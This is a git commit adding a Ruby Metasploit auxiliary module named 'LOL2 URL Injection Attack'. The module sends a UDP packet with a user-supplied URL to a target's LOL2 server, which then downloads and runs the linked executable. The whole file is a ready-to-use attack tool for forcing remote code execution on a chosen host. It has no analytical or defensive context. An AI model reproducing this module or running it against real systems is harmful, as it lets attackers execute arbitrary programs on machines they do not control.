7dd6cb2a12d3d797f143c1cd7ad48f9fc26c3107
finalmark045 <finalmark045@gmail.com>
2012-12-06 14:44:09 -0800

    Create link_injection.rb

---
+++ link_injection.rb
@@ -0,0 +1,39 @@
+require 'msf/core'
+require 'socket'
+
+class Metasploit3 < Msf::Auxiliary
+
+  def initialize(info = {})
+		super(update_info(info,
+			'Name' => 'LOL2 URL Injection Attack',
+			'Description' => %q{LOL2 is a simple python server which will
+					download and open any URL it is sent. Give this
+					module a URL pointing to an executable and it will
+					be run on the target system.},
+			'Author' => 'krasiph',
+			'License' => MSF_LICENSE,
+			'Version' => '1.0.1'
+		))
+		
+		register_options([
+			OptString.new('URL',[true,"Link to the executable."]),
+			OptString.new('RHOST',[true,"Target host."]),
+			OptInt.new('RPORT',[true,"Target port."])
+		])
+	end
+
+	def rhost
+		datastore['RHOST']
+	end
+
+	def rport
+		datastore['RPORT'].to_i
+	end
+
+	def run()
+		socket = UDPSocket.new
+		print_status('Sending Packet')
+		socket.send datastore['URL'], 0, rhost, rport
+		print_status('Done')
+	end
+end
